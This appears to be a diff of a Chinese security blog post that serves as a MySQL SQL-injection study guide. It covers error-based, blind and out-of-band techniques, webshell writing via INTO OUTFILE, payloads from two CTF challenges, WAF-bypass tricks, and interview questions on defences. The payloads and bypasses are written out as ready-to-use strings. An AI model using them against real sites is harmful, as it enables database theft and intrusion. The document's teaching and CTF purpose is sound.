@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>SQL注入总结 | wh1t3zer</title>
+  <title>SQL注入总结（MYSQL篇） | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -575,14 +575,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/img10.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/img16.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        SQL注入总结
+        SQL注入总结（MYSQL篇）
       </span>
     </div>
     
@@ -622,9 +622,199 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h2 id="0x00写在前面"><a href="#0x00写在前面" class="headerlink" title="0x00写在前面"></a>0x00写在前面</h2><p>尽管目前厂商的防护手段都经过几轮迭代升级，但SQL注入仍是漏洞高发方式，本文记下对SQL注入所学习到的方法，也是对以前学过的做一个系统复习，里面也加入一些企业面试常问的问题。</p>
-<h2 id="0x01分类"><a href="#0x01分类" class="headerlink" title="0x01分类"></a>0x01分类</h2><p>SQL注入从注入方式分为两大类，一种是<strong>回显注入</strong>，一种是<strong>无回显注入</strong></p>
-<h4 id="1、回显注入"><a href="#1、回显注入" class="headerlink" title="1、回显注入"></a>1、回显注入</h4><h4 id="2、无回显注入"><a href="#2、无回显注入" class="headerlink" title="2、无回显注入"></a>2、无回显注入</h4>
+        <h2 id="0x00写在前面"><a href="#0x00写在前面" class="headerlink" title="0x00写在前面"></a>0x00写在前面</h2><p>尽管目前厂商的防护手段都经过几轮迭代升级，但SQL注入仍是漏洞高发方式，本文记下对SQL注入所学习到的方法，也是对以前学过的做一个系统复习，里面也加入一些企业面试常问的问题，以下部分内容均为个人理解，如有错误，多多指正。</p>
+<p>使用的靶场是SQLI，地址为<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<h2 id="0x01分类"><a href="#0x01分类" class="headerlink" title="0x01分类"></a>0x01分类</h2><p>SQL注入从注入方式分为三大类，一种是<strong>回显注入</strong>，一种是<strong>无回显注入</strong>，还有一种是其他形式的注入，比如JSON注入、宽字节注入等</p>
+<h4 id="一、回显注入"><a href="#一、回显注入" class="headerlink" title="一、回显注入"></a>一、回显注入</h4><p>回显注入中主要为报错注入</p>
+<h5 id="1、报错注入"><a href="#1、报错注入" class="headerlink" title="1、报错注入"></a>1、报错注入</h5><h6 id="（1）常规报错注入"><a href="#（1）常规报错注入" class="headerlink" title="（1）常规报错注入"></a>（1）常规报错注入</h6><p>顾名思义，常规报错就是通过单引号、双引号、括号等形式进行SQL构造，让服务器返回SQL语句相关错误，从而fuzz出SQL注入点。</p>
+<h5 id="2、特性函数报错"><a href="#2、特性函数报错" class="headerlink" title="2、特性函数报错"></a>2、特性函数报错</h5><h6 id="（1）updatexml注入"><a href="#（1）updatexml注入" class="headerlink" title="（1）updatexml注入"></a>（1）updatexml注入</h6><p>看函数可以知道这个作用是用来更新xml文档的。</p>
+<p>在这个函数中可以写入一个子查询语句，尽管不符合xpath的规则会报错但同时也会把SQL查询的东西带出来，实现报错注入的目的。</p>
+<p> 用法：updatexml(xml_document, xpath_string, new_value) </p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称 </p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p> 第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select substr(xxx,32,1) from xxx limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h6 id="（2）extractvalue注入"><a href="#（2）extractvalue注入" class="headerlink" title="（2）extractvalue注入"></a>（2）extractvalue注入</h6><p>从一个使用了xpath语法的xml字符串提取一个值</p>
+<p>用法：extractvalue(xml_frag, xpath_expr)</p>
+<p>第一个参数：xml_frag是xml文档对象名称，string类型</p>
+<p>第二个参数：xpath_expr是使用xpath语法格式的路径</p>
+<p>原理：当xpath_expr不符合xpath格式时会报错，~在ascii编码中是0x7e，不符合xpath格式，从而达到报错并把查询语句的结果带外</p>
+<h6 id="（3）floor注入"><a href="#（3）floor注入" class="headerlink" title="（3）floor注入"></a>（3）floor注入</h6><p>这个注入方式需要配合rand()函数和group by 语句</p>
+<p>floor(x)</p>
+<p>返回小于或等于x的最大整数</p>
+<p>rand()</p>
+<p>返回一个0到1的随机数，一般这里用的是rand(0)，是固定一个0-1之间的伪随机数</p>
+<p>group by 对查询的结果进行分组</p>
+<p>原理：当count(*)，floor(rand(0))和group by 同时执行时，会爆出duplicate entry错误</p>
+<p>这是基于floor(rand(0)*2)的不确定性，可能为0也可能为1也可能为2，因为这里乘以了2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from table group by concat(database(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>
+
+<p><strong>group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将值加1，如果不存在，则将该主键插入到临时表中，注意是插入！</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原理：当count(*)，floor(rand(0))和group by 同时执行时，会爆出duplicate entry错误</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次</strong></p>
+<p>网上大部分文章都说必须要有三条记录以上才可以报错。</p>
+<p>实则不是，只要序列满足0101或1010，只要满足2条数据就可以进行报错注入</p>
+<p>测试结果当floor(rand(14)*2)时序列是1010，可以满足这个报错</p>
+<p>本质上这个报错是向临时表插入数据时，插入了重复的主键导致的报错</p>
+<h6 id="（4）总结"><a href="#（4）总结" class="headerlink" title="（4）总结"></a>（4）总结</h6><p>updatexml需要在查询后limit限制回显条数，limit x,1，x为变量</p>
+<p>extractvalue在concat里插叙的语句还是需要group_concat，而updatexml不用</p>
+<p>且最多只显示31位，若为MD5等大于32位的字符如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select substr(xxx,32,1) from xxx limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="二、无回显注入"><a href="#二、无回显注入" class="headerlink" title="二、无回显注入"></a>二、无回显注入</h4><h6 id="1、盲注"><a href="#1、盲注" class="headerlink" title="1、盲注"></a>1、盲注</h6><h6 id="（1）基于时间的盲注"><a href="#（1）基于时间的盲注" class="headerlink" title="（1）基于时间的盲注"></a>（1）基于时间的盲注</h6><p><strong>benchmark()</strong></p>
+<p>是一个延时函数，但属于侧信道攻击，比较消耗CPU的资源</p>
+<p>用法：benchmark(count,expr)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(5000,encode(&#x27;MSG&#x27;,&#x27;by 5 seconds&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><strong>sleep()</strong></p>
+<p>常用的mysql延时函数</p>
+<p>sleep(1)</p>
+<p>延时一秒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h6 id="（2）基于布尔类型的盲注"><a href="#（2）基于布尔类型的盲注" class="headerlink" title="（2）基于布尔类型的盲注"></a>（2）基于布尔类型的盲注</h6><p>以下是一些常见布尔注入使用的函数</p>
+<p><strong>substr()</strong></p>
+<p>截取目标字符串</p>
+<p>用法：substr(str, start, length)，其中str为字符串，start为起始位置，length为长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema = database()limit 0,1),1,1))=101 --+  </span><br></pre></td></tr></table></figure>
+
+<p><strong>left()</strong></p>
+<p>与substr()类似，也是截取目标字符串</p>
+<p>用法：left(str,length)，其中str是要提取子字符串的字符串，length是一个正整数，指定将从左边返回的字符数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ord()</strong></p>
+<p>将返回字符串的第一位字符转换为ASCII码</p>
+<p>用法：ord(str)，其中str是要将第一位转换为ASCII码的字符串，可以单独也可以完整</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER  BY id LIMIT 0,1),1,1))&gt;98--+</span><br></pre></td></tr></table></figure>
+
+<h6 id="2、DNSLog外带注入"><a href="#2、DNSLog外带注入" class="headerlink" title="2、DNSLog外带注入"></a>2、DNSLog外带注入</h6><p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p><a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h4 id="三、其他注入形式"><a href="#三、其他注入形式" class="headerlink" title="三、其他注入形式"></a>三、其他注入形式</h4><h5 id="1、mysql写shell"><a href="#1、mysql写shell" class="headerlink" title="1、mysql写shell"></a>1、mysql写shell</h5><p>（1）有root权限</p>
+<p>（2）知道web的绝对路径</p>
+<p>（3）有select、update关键词权限</p>
+<p>（4）security_file_priv需要关闭状态</p>
+<p>（5）在PHP中需要关闭GPC（魔术引号）</p>
+<p>（6）使用lines terminate by 写webshell</p>
+<h5 id="2、order-by-注入"><a href="#2、order-by-注入" class="headerlink" title="2、order by 注入"></a>2、order by 注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from goods order by $_GET[&#x27;params&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>order by 可以直接在后面加入布尔类型注入，也可加入时间盲注，基本操作跟上述提到的普通注入方式一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by if(1=1,username,password);</span><br><span class="line">order by if((substr((select user()),1,1)=&#x27;r1&#x27;),username,password);</span><br><span class="line"></span><br><span class="line">order by if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),password);</span><br><span class="line">order by if((substr((select user()),1,1)=&#x27;r&#x27;),(select 1 from (select sleep(2)) as b),password);</span><br></pre></td></tr></table></figure>
+
+<p><strong>procedure analyse</strong>注入</p>
+<p>原理是利用procedure analyse 参数后注入，实际上是一种报错注入方式</p>
+<p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 order by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以 利用 procedure analyse 进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、lines-terminate-by写webshell"><a href="#3、lines-terminate-by写webshell" class="headerlink" title="3、lines terminate by写webshell"></a>3、lines terminate by写webshell</h5><p>?sort&#x3D;1  Into outfile c:\wamp\www\sqllib\test1.txt lines terminated by 0x(网马进行 16 进制转换)</p>
+<h5 id="4、limit后注入"><a href="#4、limit后注入" class="headerlink" title="4、limit后注入"></a>4、limit后注入</h5><p>这里也可以搭配ordey by 和 procedure analyse注入的形式，其根本也是构造报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id &gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>
+
+<h5 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h5><p>堆叠实际上就是多条语句同时执行，如：sql1;sql2;<br>可写入多条语句，比如select之后可以写一条create、update这种，还可以delete删除</p>
+<p>在php中常用mysqli_multi_query()进行多语句执行，但实际上的环境大部分都是mysqli_ query()</p>
+<h5 id="6、宽字节注入"><a href="#6、宽字节注入" class="headerlink" title="6、宽字节注入"></a>6、宽字节注入</h5><p>什么是<strong>宽字节</strong></p>
+<p>GB2312、GBK、GB18030、BIG5、Shift_JIS编码方式均属于宽字节编码</p>
+<p>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，成为宽字节</p>
+<p>原因是因为PHP发送查询语句时会使用“character_set_client &#x3D; gbk”，这时MYSQL使用的是GBK编码</p>
+<p>在GBK编码中，默认2个字节为1个汉字</p>
+<p>常见造成宽字节注入的函数：</p>
+<p>addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc</p>
+<p>原理：输入’或”会通过addslashes转义成\，这表面上可以防止某些SQL注入，但是如果加入%df就会把\吃掉，这是因为\在MYSQL的宽字节编码中是%5c，这时候就会变成一个汉字</p>
+<h5 id="7、二次注入"><a href="#7、二次注入" class="headerlink" title="7、二次注入"></a>7、二次注入</h5><p>原理就是攻击者在输入SQL注入语句时被转义了，但仍把这些恶意的查询放到了数据库，在下一次请求数据时会调用数据库并把恶意数据提取出来，实现被动（二次）注入，一般会在白盒审计中出现，无法通过黑盒这种形式实现。</p>
+<h2 id="0x02案例展示-CTF"><a href="#0x02案例展示-CTF" class="headerlink" title="0x02案例展示(CTF)"></a>0x02案例展示(CTF)</h2><p>借CTF历年赛事经典题目来分析SQL注入绕过姿势</p>
+<h4 id="一、2024源鲁杯——sInXx"><a href="#一、2024源鲁杯——sInXx" class="headerlink" title="一、2024源鲁杯——sInXx"></a>一、2024源鲁杯——sInXx</h4><p>payload初次尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">juan79%27%09and%09%281%3D1%29%23</span><br></pre></td></tr></table></figure>
+
+<p>检测是过滤了逗号，这时候利用到等价函数替换，可以用join()连接表去测试列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%091)A%09join%09(SELECT%091)B%09join%09(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></pre></td></tr></table></figure>
+
+<p>获得table，这里是or被禁用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  UNION   SELECT  *   FROM    ((SELECT    GROUP_CONCAT(TABLE_NAME)    FROM    sys.schema_table_statistics WHERE   TABLE_SCHEMA=DATABASE())A   join    (SELECT 1)B join    (SELECT 1)C join    (SELECT 1)D join    (SELECT 1)E)#</span><br></pre></td></tr></table></figure>
+
+<p>拿数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; UNION SELECT * FROM ((SELECT `2` FROM (SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b) UNION SELECT * FROM  DataSyncFLAG)alimit 2 offset 1)A join (SELECT 1)B join (SELECT 1)C join (SELECT 1)D join (SELECT 1)E)#</span><br></pre></td></tr></table></figure>
+
+<h4 id="二、2022羊城杯——ComeAndLogin"><a href="#二、2022羊城杯——ComeAndLogin" class="headerlink" title="二、2022羊城杯——ComeAndLogin"></a>二、2022羊城杯——ComeAndLogin</h4><p>获得库和表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1111\&amp;password=or%0c((0xxxxx,0xxxxx,1,2,3,4,5,6,7,8)&lt;(table sys.x$ps_schema_table_statistics_io limit 52,1))%23</span><br></pre></td></tr></table></figure>
+
+<p>获得用户账号和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1111\&amp;password=or%0c((1,0x6161646d696e6e,0x6565656633343530393237453034656263363935326664626337356337633430)&lt;(table%0cusertablelist%0climit%0c0,1))%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03绕过思路"><a href="#0x03绕过思路" class="headerlink" title="0x03绕过思路"></a>0x03绕过思路</h2><h4 id="一、内敛注释"><a href="#一、内敛注释" class="headerlink" title="一、内敛注释"></a>一、内敛注释</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!50001 select 1,2,3*/;</span><br><span class="line">该语句只能运行在mysql版本大于5.00.01时</span><br></pre></td></tr></table></figure>
+
+<h4 id="二、伪装百度爬虫脚本"><a href="#二、伪装百度爬虫脚本" class="headerlink" title="二、伪装百度爬虫脚本"></a>二、伪装百度爬虫脚本</h4><p>字面意思，给予符合百度爬虫的特征</p>
+<h4 id="三、IP白名单"><a href="#三、IP白名单" class="headerlink" title="三、IP白名单"></a>三、IP白名单</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for</span><br><span class="line">X-remote-IP</span><br><span class="line">X-remote-addr</span><br><span class="line">X-Real-IP</span><br></pre></td></tr></table></figure>
+
+<p>在header中修改这些请求头可以实现bypass</p>
+<h4 id="四、静态资源"><a href="#四、静态资源" class="headerlink" title="四、静态资源"></a>四、静态资源</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1.php/1.js?id=1</span><br></pre></td></tr></table></figure>
+
+<p>waf不会对静态资源请求内容进行过滤</p>
+<p>.js、.jpg、.swf、.css等</p>
+<h4 id="五、更改请求头"><a href="#五、更改请求头" class="headerlink" title="五、更改请求头"></a>五、更改请求头</h4><p>更改User-Agent，部分内容跟伪装百度爬虫类似，早期的waf也是可以修改这个UA来实现Bypass</p>
+<h4 id="六、使用代理池"><a href="#六、使用代理池" class="headerlink" title="六、使用代理池"></a>六、使用代理池</h4><p>动态IP代理池，不怕被WAF封禁IP，可逐一尝试waf过滤的关键字</p>
+<h4 id="七、增加延时参数"><a href="#七、增加延时参数" class="headerlink" title="七、增加延时参数"></a>七、增加延时参数</h4><p>延长执行时间，伪装成正常业务</p>
+<h2 id="0x04进阶绕过"><a href="#0x04进阶绕过" class="headerlink" title="0x04进阶绕过"></a>0x04进阶绕过</h2><h4 id="一、更改数据提交方式"><a href="#一、更改数据提交方式" class="headerlink" title="一、更改数据提交方式"></a>一、更改数据提交方式</h4><p>可将GET形式改成POST、OPTION、HEAD等比较少见的请求方式</p>
+<h4 id="二、大小写混合"><a href="#二、大小写混合" class="headerlink" title="二、大小写混合"></a>二、大小写混合</h4><p>比如将select修改为sELeCt</p>
+<h4 id="三、编码解码类"><a href="#三、编码解码类" class="headerlink" title="三、编码解码类"></a>三、编码解码类</h4><p>将payload改成base64编码、url编码、unicode编码等</p>
+<p>s-&gt;%73-&gt;%25%37%33（url编码）</p>
+<h4 id="四、注释符混用"><a href="#四、注释符混用" class="headerlink" title="四、注释符混用"></a>四、注释符混用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F;</p>
+<p>&#x2F; &#x2F;当成空格</p>
+<h4 id="五、双写绕过"><a href="#五、双写绕过" class="headerlink" title="五、双写绕过"></a>五、双写绕过</h4><p>比如将select修改为sselectelect</p>
+<h4 id="六、等价函数替换"><a href="#六、等价函数替换" class="headerlink" title="六、等价函数替换"></a>六、等价函数替换</h4><p>Hex() bin()等价于ascii()</p>
+<p>@@user等价于user()</p>
+<p>@@version等价于version()</p>
+<p>Sleep() 等价于 benchmark()</p>
+<p>Mid() substring() 等价于substr()</p>
+<p>等号“&#x3D;”替换为like</p>
+<h4 id="七、特殊符号混用"><a href="#七、特殊符号混用" class="headerlink" title="七、特殊符号混用"></a>七、特殊符号混用</h4><p>%0a在MYSQL是换行，可以当空格使用</p>
+<p>%00截断</p>
+<p>%09 TAB 键（水平）</p>
+<p>%0c 新的一页</p>
+<p>%0d return 功能</p>
+<p>%0b TAB 键（垂直）</p>
+<p>%a0 空格</p>
+<h4 id="八、借助数据库特性"><a href="#八、借助数据库特性" class="headerlink" title="八、借助数据库特性"></a>八、借助数据库特性</h4><p>每个数据库有不同特点，也有可以利用的点，例如mysql就有一个mysql黑魔法，属于mysql专有的特性</p>
+<h4 id="九、垃圾数据溢出"><a href="#九、垃圾数据溢出" class="headerlink" title="九、垃圾数据溢出"></a>九、垃圾数据溢出</h4><p>不断填充数据包，在某些WAF中，过大的数据包或过长数据长度会默认舍弃检测，避免降低业务效率，直接放行</p>
+<h4 id="十、HTTP参数污染"><a href="#十、HTTP参数污染" class="headerlink" title="十、HTTP参数污染"></a>十、HTTP参数污染</h4><p>如上传的参数为在特定情况下为bbs&#x3D;u&amp;bbs&#x3D;n&amp;bbs&#x3D;i&amp;bbs&#x3D;o&amp;bbs&#x3D;n&amp;bbs&#x3D;select 1,user(),3如果服务器端是将获取到的参数组合的话，就可以达到绕过的目的。</p>
+<p>组合起来就是union select 1,user(),3</p>
+<h4 id="十一、MYSQL黑魔法"><a href="#十一、MYSQL黑魔法" class="headerlink" title="十一、MYSQL黑魔法"></a>十一、MYSQL黑魔法</h4><p>select{xusername}from{x11test.admin};</p>
+<p><strong>handle</strong>替代<strong>select</strong></p>
+<p>这里是一个鲜为人知的知识点，也是从一篇阿里云大会上的文章看到的，这里handle是mysql独有的关键字。这条语句使我们能够一行一行的浏览一个表中的数据，比较冷门，毕竟属于是mysql的特性，所以没有列入SQL语句类型里面</p>
+<h4 id="十二、Information-schema绕过"><a href="#十二、Information-schema绕过" class="headerlink" title="十二、Information_schema绕过"></a>十二、Information_schema绕过</h4><p>mysql.innodb_table_stats</p>
+<p>sys.schema_table_statistics</p>
+<p>sys.x$statement_analysis</p>
+<h2 id="0x05常见面试题"><a href="#0x05常见面试题" class="headerlink" title="0x05常见面试题"></a>0x05常见面试题</h2><h4 id="一、启明星辰"><a href="#一、启明星辰" class="headerlink" title="一、启明星辰"></a>一、启明星辰</h4><p>（1）sql注入用过哪些函数？<br> – limit()、concat()、group_concat()、Substr()、Ascii()、Left()<br> – length()、updataxml()</p>
+<p>（2）sql注入的简单原理及其如何防御？</p>
+<p>将恶意SQL语句传进一个SQL语句中，这个语句没有经过处理直接进入到SQL查询环节，完整执行了这个语句并产生特定结果；永远不信任来自客户的输入，入参转义，比如对单引号或双引号进行\转义，出参过滤，这样可以很大概率防止二次注入的发生。如在代码上可采用预编译方法，对要进行SQL的代码，不直接传入外部输入的数据，而是直接预编译成字符串传入，这样不会造成SQL恶意执行；直接上WAF</p>
+<h4 id="二、字节跳动"><a href="#二、字节跳动" class="headerlink" title="二、字节跳动"></a>二、字节跳动</h4><p>（1）java系统中的sql注入怎么做一个防御和修复？</p>
+<p>使用preparestatement预编译，将SQL语句变成字符串而不直接插入到数据库查询；若在Mybait的框架中，采用#{}传参而不用${}传参，原理是跟预编译一样的；对用户输入的数据采用过滤处理，例如将单引号或双引号转义；直接上WAF；</p>
+<p>（2）SQL注入如何判断注入点？</p>
+<p>在某些传参参数中输入单引号、双引号或括号，并输入例如 1&#x3D;1 1&#x3D;2 # 观察数据是否正常显示，若返回错误，大概率存在SQL注入点</p>
+<h4 id="三、长亭科技"><a href="#三、长亭科技" class="headerlink" title="三、长亭科技"></a>三、长亭科技</h4><p>（1）php在做sql注入防御时有哪些方法？</p>
+<p>（2）java做sql注入的防御？</p>
+<p>同上</p>
+<h4 id="四、腾讯安全"><a href="#四、腾讯安全" class="headerlink" title="四、腾讯安全"></a>四、腾讯安全</h4><p>（1）sql注入过waf了解吗，若一个sql注入过滤了information关键词，怎么绕过？</p>
+<p>mysql.innodb_table_stats</p>
+<p>sys.schema_table_statistics</p>
+<p>sys.x$statement_analysis</p>
+<p>（2）sql注入了解吗，讲一讲二次注入的原理？</p>
+<p>黑客对数据库插入了脏数据，恶意查询语句，尽管在插入时进行了转义等处理，但再次调用查询语句时里面的脏数据没有经过处理直接返回，导致二次注入</p>
+<h4 id="五、58同城"><a href="#五、58同城" class="headerlink" title="五、58同城"></a>五、58同城</h4><p>（1）假如说有个SQL注入如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where userid = &#123;&#125;;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>response里面没有返回内容</li>
+<li>1s就超时了，直接返回404页面</li>
+</ol>
+<p>这种情况下如何注入?</p>
+<p>这个暂时没看到比较官方标准答案，可以拓展下思路</p>
+<h4 id="六、京东"><a href="#六、京东" class="headerlink" title="六、京东"></a>六、京东</h4><p>（1）sql注入的简单原理及其如何防御？</p>
+<p>同上</p>
+<h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>SQL注入的姿势千变万化，在每次学习到一条新bypass payload时还是多记一记。根本上还是要多学SQL语法和特点，几乎所有的Bypass无非就是基于SQL特点去操作的。</p>
+<p>同时还要多学习更多的WAF，无论是开源还是从哪个地方获得的，根本一点：<strong>多尝试</strong></p>
+
       </div>
       <div class="post-tags-categories">
         
@@ -645,7 +835,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2023/10/22/SQL注入总结/" target="_blank" title="SQL注入总结">https://wh1t3zer.github.io/2023/10/22/SQL注入总结/</a>
+    <a href="/2023/10/22/SQL注入总结（MYSQL篇）/" target="_blank" title="SQL注入总结（MYSQL篇）">https://wh1t3zer.github.io/2023/10/22/SQL注入总结（MYSQL篇）/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
